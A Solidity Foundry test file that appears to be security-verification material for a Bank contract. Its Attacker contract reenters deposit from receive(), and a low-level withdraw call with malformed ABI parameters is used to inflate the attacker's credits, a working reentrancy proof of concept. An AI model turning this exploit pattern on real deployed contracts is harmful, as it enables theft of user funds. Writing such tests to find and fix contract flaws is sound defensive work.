pragma solidity ^0.8.13;
import "forge-std/Test.sol";
import "../Bank.sol";

contract Attacker {
    Bank public bank;
    constructor(Bank _bank) {
        bank = _bank;
    }
    receive() external payable {
        // Reenter and deposit the received ETH back into the bank
        bank.deposit{value: msg.value}();
    }
}

contract BankTest is Test {       
    Bank immutable bank;
    
    constructor() {
        // deploying a Bank contract
        address bank_deployer = address(0xBEEF);
        vm.prank(bank_deployer);
        bank = new Bank();
    }
    
    function test_credits_inc_onlyif_deposit_violation() public {

        // Setup: deploy attacker and fund + pre-deposit 32 wei
        Attacker attacker = new Attacker(bank);
        vm.deal(address(attacker), 1 ether);
        vm.prank(address(attacker));
        bank.deposit{value: 32}();

        address user = address(attacker);
        assertNotEq(user, address(bank), "user address equal to bank address");

        uint256 user_credits_before = bank.credits(user);

        address sender = address(attacker);
        vm.prank(sender);

        // Call withdraw via the dynamic call; due to ABI packing with a bytes param,
        // withdraw(uint) will read amount = 0x20 (32)
        bytes4 function_selector = bank.withdraw.selector;
        uint256 msg_value = 0;
        bytes memory params = hex"";

        // Trigger withdraw -> sends 32 wei to attacker -> attacker reenters deposit with 32 wei
        address(bank).call{value: msg_value}(abi.encodeWithSelector(function_selector, params));        
	
        // Initial dynamic call wasn't deposit by the same user
        assert(function_selector != bank.deposit.selector || sender != user);

        uint256 user_credits_after = bank.credits(user);
        // Before: 32 wei deposit => credits = 33
        // Withdraw 32 => credits = 1; reentrant deposit 32 => credits += 33 => total 34 (> 33)
        assertGt(user_credits_after, user_credits_before, "user credits did not increase");
    }
}